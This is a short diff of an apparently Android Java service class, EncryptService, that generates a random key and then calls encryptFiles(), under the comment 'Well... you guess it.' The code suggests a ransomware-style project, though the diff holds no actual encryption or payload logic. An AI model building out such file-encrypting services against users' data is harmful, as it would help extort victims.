@@ -1,7 +1,6 @@
 package alepacheco.com.rw.services;
 
 import alepacheco.com.rw.io.IO;
-import alepacheco.com.rw.persistence.LocalStorage;
 
 /**
  * Created by joao on 05/07/2017.
@@ -23,7 +22,7 @@ public class EncryptService extends MyService {
                     try {
                         generateRandomKey();
                         // Well... you guess it.
-                        encryptFile();
+                        encryptFiles();
                         break;
                     }catch (Exception e){
                         e.printStackTrace();
